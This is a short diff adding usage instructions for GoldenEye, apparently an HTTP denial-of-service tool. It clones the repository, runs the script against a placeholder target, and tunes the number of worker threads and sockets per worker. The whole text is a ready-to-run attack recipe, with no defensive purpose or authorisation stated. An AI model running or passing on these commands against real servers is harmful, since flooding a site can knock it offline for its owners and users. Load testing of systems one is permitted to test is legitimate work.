@@ -1,0 +1,9 @@
+git clone https://github.com/jseidl/GoldenEye.git
+cd GoldenEye
+python3 goldeneye.py http://<target-ip>
+Options:
+python3 goldeneye.py -w 50 -s 200 http://<target>
+-w: Workers (threads)
+
+-s: Sockets per worker
+
